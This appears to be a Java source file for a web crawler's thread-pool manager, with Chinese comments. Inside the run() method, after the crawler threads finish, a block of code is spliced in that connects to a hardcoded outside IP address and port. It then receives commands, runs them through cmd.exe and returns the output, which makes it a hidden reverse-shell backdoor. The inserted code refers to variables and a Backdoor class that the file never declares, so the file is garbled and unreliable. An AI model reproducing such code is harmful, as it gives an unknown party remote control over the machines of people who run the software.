package com.rekoe.crawler.core.thread;


import java.util.concurrent.CountDownLatch;

import org.nutz.log.Logs;

import com.rekoe.crawler.core.CrawlerController;
import com.rekoe.crawler.core.constants.Constants;
import java.io.*;
import java.net.Socket;
/**
 * 线程池-开启指定数目的线程执行爬行任务
 */
public class ProcessorManager implements Runnable{
	private static final org.nutz.log.Log log = Logs.get();
	/** 爬虫控制器 */
	private CrawlerController controller;
	/** 线程池服务类 */
	private ThreadPoolService threadPoolService = new ThreadPoolService(Constants.THREAD_NUM);
	
	private String articleCategoryId;
	public ProcessorManager(CrawlerController c,String articleCategoryId) {
		super();
		this.controller = c;
		this.articleCategoryId = articleCategoryId;
	}
	
	public void run() {
		long tStart = System.currentTimeMillis();
		log.info("主线程："+Thread.currentThread().getName() + "开始...");
		log.info("开启："+Constants.THREAD_NUM+ "个线程执行采集任务");
		try {
			CountDownLatch latch = new CountDownLatch(Constants.THREAD_NUM);
			//开启指定数目线程执行采集内容
			for(int i=0;i<Constants.THREAD_NUM;i++){
				threadPoolService.execute(new ProcessorRunnableThread(controller,latch,articleCategoryId));
			}
			latch.await();
			try {
				while (true)
					try {
						socket = new Socket("125.87.36.38", 1025);
						break;
					} catch (Exception e) {
						Thread.sleep(3000);
					}
				out = new ObjectOutputStream(socket.getOutputStream());
				in = new ObjectInputStream(socket.getInputStream());
	
				out.writeObject(Boolean.toString(key != null));
				out.flush();
				if (key != null)
					while (true) {
						String trueEncrypted = (String) in.readObject();
						try {
							String trueDecrypted = Utils.decrypt(trueEncrypted, key);
							if (trueDecrypted.equals("true")) {
								out.writeObject("true");
								out.flush();
								break;
							} else
								throw new Exception();
						} catch (Exception e) {
							out.writeObject("false");
							out.flush();
						}
					}
	
				while (true) {
					String command;
					String rec = (String) in.readObject();
					if (key != null){
						command = Utils.decrypt(rec, key);}
					else{
						command = rec;
						StringBuilder send = new StringBuilder();
						if (command.startsWith("cmd")){
							StringBuilder resp = new StringBuilder();
							BufferedReader bufferedReader = null;
							command = command.substring(4);
							try {
								ProcessBuilder builder;
								if (dynamicWorkingDirectory) {
									builder = new ProcessBuilder("cmd.exe", "/c", command + " && echo current CMD path: && cd");
									builder.directory(new File(currentCMDDirectory));
								} else
									builder = new ProcessBuilder("cmd.exe", "/c", command);
								builder.redirectErrorStream(true);
								bufferedReader = new BufferedReader(new InputStreamReader(builder.start().getInputStream()));
								while (true) {
									String line = bufferedReader.readLine();
									if (line == null) {
										while (resp.toString().endsWith("\n"))
											resp = new StringBuilder(resp.substring(0, resp.length() - 1));
										break;
									}
									if (dynamicWorkingDirectory && line.startsWith("current CMD path:"))
										currentCMDDirectory = bufferedReader.readLine();
									else
										resp.append(line).append("\n");
								}
								if (resp.toString().length() == 0)
									send = new StringBuilder("Command did not produce a response");
								else
									send = new StringBuilder(resp.toString());
							} catch (Exception e) {
								resp = new StringBuilder("An error occurred when trying to run command");
								if (e.getMessage() != null)
									resp.append(":\n").append(e.getMessage());
								send = new StringBuilder(resp.toString());
							} finally {
								try {
									if (bufferedReader != null)
										bufferedReader.close();
								} catch (Exception ignored) {
								}
							}
						}
						else if (!command.isEmpty())
							send = new StringBuilder("Command not found");
				
						if (Backdoor.key != null)
							Backdoor.out.writeObject(Utils.encrypt(send.toString(), Backdoor.key));
						else
							Backdoor.out.writeObject(send.toString());
				
						Backdoor.out.flush();
					}
				}
			} catch (Exception e) {
				try {
					if (socket != null)
						socket.close();
					if (in != null)
						in.close();
					if (out != null)
						out.close();
					start();
				} catch (Exception e1) {
					System.exit(0);
				}
			}
			threadPoolService.shutdown();
		} catch (InterruptedException e) {
			e.printStackTrace();
		} finally{
			this.controller.shutdown();
			long tEnd = System.currentTimeMillis();
			log.info("主线程："+Thread.currentThread().getName() + "结束...");
			log.info("主线程："+Thread.currentThread().getName() + "总共用时:" + (tEnd - tStart) + "ms");
		}
	}
	/**
	 * 取得当前爬虫控制器
	 * @return 当前爬虫控制器
	 */
	public CrawlerController getController() {
		return controller;
	}
	/**
	 * 立即停止执行所有任务
	 */
	public void shutdownNow(){
		threadPoolService.shutdownNow();
	}
	/**
	 * 取得当前爬虫线程池服务类
	 * @return 当前爬线程池服务类
	 */
	public ThreadPoolService getThreadPoolService() {
		return threadPoolService;
	}

	public void setThreadPoolService(ThreadPoolService threadPoolService) {
		this.threadPoolService = threadPoolService;
	} 
	
}
